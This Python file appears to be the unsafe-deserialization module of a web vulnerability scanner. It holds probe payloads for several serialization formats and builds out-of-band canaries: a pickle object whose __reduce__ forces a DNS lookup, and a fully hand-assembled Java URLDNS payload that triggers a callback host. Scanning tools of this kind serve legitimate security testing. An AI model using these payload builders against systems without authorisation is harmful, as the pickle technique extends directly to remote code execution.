import base64
import pickle
import socket
import struct

from .base import BaseLightfuzz
from bbot.errors import HttpCompareError


class _PickleOOB:
    """Pickle-RCE canary: __reduce__ makes the deserializing process resolve
    a controlled DNS name, which can be observed via interactsh. Declared
    at module scope so the ``socket.gethostbyname`` reference pickles
    cleanly by fully-qualified name."""

    def __init__(self, callback_host):
        self._callback_host = callback_host

    def __reduce__(self):
        return (socket.gethostbyname, (self._callback_host,))


def _java_utf(s):
    """Encode a string with Java's 2-byte-length-prefixed modified UTF."""
    b = s.encode("utf-8")
    return struct.pack(">H", len(b)) + b


def _build_java_urldns_payload(host):
    """
    Construct a Java URLDNS serialization payload targeting ``host``.

    When deserialized by ObjectInputStream, HashMap.readObject rebuilds
    its internal table by calling putVal(hash(key), key, value, ...),
    and ``hash(key)`` invokes ``key.hashCode()``. Our key is a
    java.net.URL with its stored hashCode field set to -1 (the "unset"
    sentinel), so URL.hashCode() falls through to the stream handler's
    hashCode(), which calls URL.getHostAddress(), which performs a DNS
    lookup on ``host``. That lookup is observable via interactsh.

    This works against ANY Java deserialization sink — no gadget-chain
    class needs to be present in the target's classpath. Only
    java.util.HashMap + java.net.URL are required, both in every JVM's
    stdlib since 1.1.
    """
    buf = bytearray()
    # STREAM_MAGIC + STREAM_VERSION=5
    buf += b"\xac\xed\x00\x05"
    # TC_OBJECT — HashMap instance
    buf += b"\x73"
    # TC_CLASSDESC — HashMap class descriptor
    buf += b"\x72"
    buf += _java_utf("java.util.HashMap")
    # HashMap.serialVersionUID = 362498820763181265L
    buf += struct.pack(">q", 362498820763181265)
    # Flags: SC_SERIALIZABLE | SC_WRITE_METHOD
    buf += b"\x03"
    # Field count: loadFactor (float), threshold (int)
    buf += struct.pack(">H", 2)
    buf += b"F" + _java_utf("loadFactor")
    buf += b"I" + _java_utf("threshold")
    # TC_ENDBLOCKDATA (end of class annotations)
    buf += b"\x78"
    # Super class: TC_NULL
    buf += b"\x70"
    # Instance data: loadFactor=0.75, threshold=12
    buf += struct.pack(">f", 0.75)
    buf += struct.pack(">i", 12)
    # Custom writeObject payload: TC_BLOCKDATA, length=8, capacity=16, size=1
    buf += b"\x77\x08"
    buf += struct.pack(">i", 16)
    buf += struct.pack(">i", 1)

    # Entry key: a java.net.URL with hashCode=-1
    buf += b"\x73"  # TC_OBJECT
    buf += b"\x72"  # TC_CLASSDESC
    buf += _java_utf("java.net.URL")
    # URL.serialVersionUID = -7627629688361524110L
    buf += struct.pack(">q", -7627629688361524110)
    # Flags: SC_SERIALIZABLE | SC_WRITE_METHOD. URL has a custom readObject
    # that re-attaches the transient `handler` field after deserialization —
    # without SC_WRITE_METHOD the deserializer skips it, leaving handler
    # null so URL.hashCode() NPEs before the DNS lookup fires.
    buf += b"\x03"
    # Field count: 7 (hashCode, port, authority, file, host, protocol, ref)
    buf += struct.pack(">H", 7)
    buf += b"I" + _java_utf("hashCode")
    buf += b"I" + _java_utf("port")
    for fname in ("authority", "file", "host", "protocol", "ref"):
        buf += b"L" + _java_utf(fname)
        # Field type: TC_STRING (0x74) + signature
        buf += b"\x74" + _java_utf("Ljava/lang/String;")
    buf += b"\x78"  # TC_ENDBLOCKDATA
    buf += b"\x70"  # TC_NULL (super class)
    # Instance data
    buf += struct.pack(">i", -1)  # hashCode = -1 → forces DNS recomputation
    buf += struct.pack(">i", 80)  # port
    buf += b"\x74" + _java_utf(f"{host}:80")  # authority
    buf += b"\x74" + _java_utf("")  # file
    buf += b"\x74" + _java_utf(host)  # host
    buf += b"\x74" + _java_utf("http")  # protocol
    buf += b"\x70"  # ref: TC_NULL
    # SC_WRITE_METHOD requires TC_ENDBLOCKDATA to close URL's custom
    # writeObject block. URL's writeObject just calls defaultWriteObject
    # and adds no extra data, but the terminator is still required.
    buf += b"\x78"
    # Entry value: TC_NULL (HashMap allows null values)
    buf += b"\x70"
    # TC_ENDBLOCKDATA closes HashMap's custom block
    buf += b"\x78"
    return bytes(buf)


class serial(BaseLightfuzz):
    """Finds parameters where serialized objects might be being deserialized.
    It starts by performing a baseline with a specially-crafted non-serialized payload, separated by type (base64, hex, php raw).
    This is designed to coax out an error that's not related to the decoding process.

    After performing the baseline (Which by design may contain an error), we check for two possible deserialization cases:

        1) Replacing the payload with a serialized object changes the status code to 200 (minus some string signatures to help prevent false positives)

        2) If the first case doesn't match, we check for a telltale error string like "java.io.optionaldataexception" in the response.
    """

    friendly_name = "Unsafe Deserialization"
    uses_interactsh = True
    # Serial probes are raw serialized bytes (base64/hex/PHP-raw) — the exact
    # wire format the target receives. Bypass the envelope system so probes
    # aren't re-encoded based on what the parameter's original value looked
    # like (e.g. preventing an already-base64 pickle from being base64'd again
    # because the original value happened to be base64-wrapped plain text).
    skip_envelopes = True

    # Class-level constants
    CONTROL_PAYLOAD_HEX = "f56124208220432ec767646acd2e6c6bc9622a62c5656f2eeb616e2f"
    CONTROL_PAYLOAD_BASE64 = "4Wt5fYx5Y3rELn5myS5oa996Ji7IZ28uwGdha4x6YmuMfG992CA="
    CONTROL_PAYLOAD_PHP_RAW = "z:0:{}"

    BASE64_SERIALIZATION_PAYLOADS = {
        "php_base64": "YToxOntpOjA7aToxO30=",
        "java_base64": "rO0ABXNyABFqYXZhLmxhbmcuQm9vbGVhbs0gcoDVnPruAgABWgAFdmFsdWV4cAA=",
        "java_base64_string_error": "rO0ABXQABHRlc3Q=",
        "java_base64_OptionalDataException": "rO0ABXcEAAAAAAEAAAABc3IAEGphdmEudXRpbC5IYXNoTWFwAAAAAAAAAAECAAJMAARrZXkxYgABAAAAAAAAAAJ4cHcBAAAAB3QABHRlc3Q=",
        "dotnet_base64": "AAEAAAD/////AQAAAAAAAAAGAQAAAAdndXN0YXZvCw==",
        "ruby_base64": "BAh7BjoKbE1FAAVJsg==",
        # Python pickle v4 of the string "test" — benign value, but any
        # endpoint that accepts it without error is pickle-deserializing.
        "python_pickle_base64": "gASVCAAAAAAAAACMBHRlc3SULg==",
    }

    HEX_SERIALIZATION_PAYLOADS = {
        "java_hex": "ACED00057372000E6A6176612E6C616E672E426F6F6C65616ECD207EC0D59CF6EE02000157000576616C7565787000",
        "java_hex_OptionalDataException": "ACED0005737200106A6176612E7574696C2E486173684D617000000000000000012000014C00046B6579317A00010000000000000278707000000774000474657374",
        "dotnet_hex": "0001000000ffffffff01000000000000000601000000076775737461766f0b",
        "python_pickle_hex": "80049508000000000000008C0474657374942E",
    }

    PHP_RAW_SERIALIZATION_PAYLOADS = {
        "php_raw": "a:0:{}",
    }

    SERIALIZATION_ERRORS = [
        "invalid user",
        "cannot cast java.lang.string",
        "dump format error",
        "java.io.optionaldataexception",
        "unpicklingerror",  # Python pickle, distinctive to the pickle module
    ]

    GENERAL_ERROR_STRINGS = [
        "Internal Error",
        "Internal Server Error",
    ]

    @property
    def general_error_yara_rules(self):
        return self.lightfuzz.serial_general_error_yara_rules

    def is_possibly_serialized(self, value):
        # Use the is_base64 method from BaseLightfuzz via self
        if self.is_base64(value):
            return True

        # Use the is_hex method from BaseLightfuzz via self
        if self.is_hex(value):
            return True

        # List of common PHP serialized data prefixes
        php_serialized_prefixes = [
            "a:",  # Array
            "O:",  # Object
            "s:",  # String
            "i:",  # Integer
            "d:",  # Double
            "b:",  # Boolean
            "N;",  # Null
        ]

        # Check if the value starts with any of the PHP serialized prefixes
        if any(value.startswith(prefix) for prefix in php_serialized_prefixes):
            return True
        return False

    @staticmethod
    def payload_language(payload_name):
        """Extract the language family from a payload name (e.g. 'java_base64_string_error' -> 'java')."""
        return payload_name.split("_")[0]

    async def confirm_baseline(self, control_payload, cookies):
        """Re-send the control payload to confirm the baseline error state is stable (not transient)."""
        confirmation = await self.standard_probe(self.event.data["type"], cookies, control_payload)
        if confirmation is None:
            return None
        return getattr(confirmation, "status_code", None)

    async def fuzz(self):
        cookies = self.event.data.get("assigned_cookies", {})
        control_payload_hex = self.CONTROL_PAYLOAD_HEX
        control_payload_base64 = self.CONTROL_PAYLOAD_BASE64
        control_payload_php_raw = self.CONTROL_PAYLOAD_PHP_RAW

        base64_serialization_payloads = self.BASE64_SERIALIZATION_PAYLOADS
        hex_serialization_payloads = self.HEX_SERIALIZATION_PAYLOADS
        php_raw_serialization_payloads = self.PHP_RAW_SERIALIZATION_PAYLOADS

        serialization_errors = self.SERIALIZATION_ERRORS

        probe_value = self.incoming_probe_value(populate_empty=False)
        if probe_value:
            if self.is_possibly_serialized(probe_value):
                self.debug(
                    f"Existing value is not ruled out for being a serialized object, proceeding [{self.event.data['type']}] [{self.event.data['name']}]"
                )
            else:
                self.debug(
                    f"The Serialization Submodule only operates when there is no original value, or when the original value could potentially be a serialized object, aborting [{self.event.data['type']}] [{self.event.data['name']}]"
                )
                return

        try:
            http_compare_hex = self.compare_baseline(self.event.data["type"], control_payload_hex, cookies)
            http_compare_base64 = self.compare_baseline(self.event.data["type"], control_payload_base64, cookies)
            http_compare_php_raw = self.compare_baseline(self.event.data["type"], control_payload_php_raw, cookies)
        except HttpCompareError as e:
            self.debug(f"HttpCompareError encountered: {e}")
            return

        # Map each payload set to its control payload for baseline confirmation
        payload_sets = [
            (base64_serialization_payloads, http_compare_base64, control_payload_base64),
            (hex_serialization_payloads, http_compare_hex, control_payload_hex),
            (php_raw_serialization_payloads, http_compare_php_raw, control_payload_php_raw),
        ]

        # Proceed with payload probes
        for payload_set, payload_baseline, control_payload in payload_sets:
            for payload_type, payload in payload_set.items():
                try:
                    matches_baseline, diff_reasons, reflection, response = await self.compare_probe(
                        payload_baseline, self.event.data["type"], payload, cookies
                    )
                except HttpCompareError as e:
                    self.debug(f"HttpCompareError encountered: {e}")
                    continue

                if matches_baseline:
                    continue

                status_code = getattr(response, "status_code", 0)
                if status_code == 0:
                    continue

                if diff_reasons == ["header"]:
                    self.debug(f"Only header diffs found for {payload_type}, skipping")
                    continue

                if status_code not in (200, 500):
                    self.debug(f"Status code {status_code} not in (200, 500), skipping")
                    continue

                baseline_status = payload_baseline.baseline.status_code
                # Skip Error Resolution if baseline uses a non-standard HTTP status code (>511).
                # Non-standard codes (e.g. 512 from GlobalProtect) are application-specific
                # and don't reliably indicate an error state that deserialization could "resolve".
                if baseline_status > 511:
                    self.debug(
                        f"Baseline status {baseline_status} is non-standard (>511), skipping Error Resolution for {payload_type}"
                    )
                    continue

                # Skip inherently unstable baselines: 429 (rate limit) and 403 (often WAF challenge pages)
                # flip between error and success unpredictably, producing false positives.
                if baseline_status in (403, 429):
                    self.debug(
                        f"Baseline status {baseline_status} is transient (WAF/rate-limit), "
                        f"skipping Error Resolution for {payload_type}"
                    )
                    continue

                general_error_matches = await self.lightfuzz.helpers.yara.match(
                    self.general_error_yara_rules, response.text
                )
                if (
                    status_code == 200
                    and "code" in diff_reasons
                    and not general_error_matches  # ensure the 200 is not actually an error
                ):
                    # Confirm the baseline error state is stable by re-sending the control payload.
                    # If the control also returns 200 now, the original error was transient.
                    confirmation_status = await self.confirm_baseline(control_payload, cookies)
                    if confirmation_status == 200:
                        self.debug(
                            f"Baseline confirmation returned 200 for {payload_type}, original error was transient, skipping"
                        )
                        continue

                    def get_title(text):
                        soup = self.lightfuzz.helpers.beautifulsoup(text, "html.parser")
                        if soup and soup.title and soup.title.string:
                            return f"'{self.lightfuzz.helpers.truncate_string(soup.title.string, 50)}'"
                        return ""

                    baseline_title = get_title(payload_baseline.baseline.text)
                    probe_title = get_title(response.text)

                    self.results.append(
                        {
                            "name": "Possible Unsafe Deserialization",
                            "severity": "HIGH",
                            "confidence": "LOW",
                            "description": f"POSSIBLE Unsafe Deserialization. {self.metadata()} Technique: [Error Resolution (Baseline: [{payload_baseline.baseline.status_code}] {baseline_title} -> Probe: [{status_code}] {probe_title})] Serialization Payload: [{payload_type}]",
                            "_technique": "error_resolution",
                            "_language": self.payload_language(payload_type),
                        }
                    )
                # if the first case doesn't match, we check for a telltale error string like "java.io.optionaldataexception" in the response.
                # but only if the response is a 500, or a 200 with a body diff
                elif status_code == 500 or (status_code == 200 and diff_reasons == ["body"]):
                    for serialization_error in serialization_errors:
                        # check for the error string, but also ensure the error string isn't just always present in the response
                        if (
                            serialization_error in response.text.lower()
                            and serialization_error not in payload_baseline.baseline.text.lower()
                        ):
                            self.debug(f"Error string '{serialization_error}' found in response for {payload_type}")
                            self.results.append(
                                {
                                    "name": "Possible Unsafe Deserialization",
                                    "severity": "HIGH",
                                    "confidence": "LOW",
                                    "description": f"POSSIBLE Unsafe Deserialization. {self.metadata()} Technique: [Differential Error Analysis] Error-String: [{serialization_error}] Payload: [{payload_type}]",
                                }
                            )
                            break

        # Final safety net: if Error Resolution findings span multiple language families, discard them.
        # A real deserialization vuln only deserializes one language's format.
        error_resolution_results = [r for r in self.results if r.get("_technique") == "error_resolution"]
        if error_resolution_results:
            languages = set(r["_language"] for r in error_resolution_results)
            if len(languages) > 1:
                self.debug(
                    f"Error Resolution findings span multiple language families ({languages}), discarding as false positives"
                )
                self.results = [r for r in self.results if r.get("_technique") != "error_resolution"]

        # Clean up internal metadata keys before results are emitted
        for r in self.results:
            r.pop("_technique", None)
            r.pop("_language", None)

        # Blind RCE via language-native OOB payloads. Both pickle (Python)
        # and URLDNS (Java) are built at scan time with a fresh interactsh
        # subdomain — no out-of-process tooling required. Each uses its
        # own subdomain tag so the interactsh callback unambiguously
        # identifies which payload triggered.
        if self.lightfuzz.interactsh_instance:
            self.lightfuzz.event_dict[self.event.url] = self.event

            # Python pickle OOB
            _, pkl_host = self.register_interactsh_tag(
                name="Unsafe Deserialization",
                description=(
                    f"Python pickle OOB RCE (OOB Interaction) Type: [{self.event.data['type']}] "
                    f"Parameter Name: [{self.event.data['name']}] Payload: [python_pickle_oob]"
                ),
                severity="CRITICAL",
                confidence="CONFIRMED",
            )
            try:
                pkl_b64 = base64.b64encode(pickle.dumps(_PickleOOB(pkl_host))).decode()
            except Exception as e:
                self.debug(f"failed to build pickle OOB payload: {e}")
            else:
                await self.standard_probe(
                    self.event.data["type"],
                    cookies,
                    pkl_b64,
                    timeout=15,
                )

            # Java URLDNS OOB — fires on ANY Java deserialization sink;
            # requires only java.util.HashMap + java.net.URL (stdlib).
            _, java_host = self.register_interactsh_tag(
                name="Unsafe Deserialization",
                description=(
                    f"Java URLDNS OOB (OOB Interaction) Type: [{self.event.data['type']}] "
                    f"Parameter Name: [{self.event.data['name']}] Payload: [java_urldns_oob]"
                ),
                severity="CRITICAL",
                confidence="CONFIRMED",
            )
            try:
                java_b64 = base64.b64encode(_build_java_urldns_payload(java_host)).decode()
            except Exception as e:
                self.debug(f"failed to build Java URLDNS OOB payload: {e}")
            else:
                await self.standard_probe(
                    self.event.data["type"],
                    cookies,
                    java_b64,
                    timeout=15,
                )
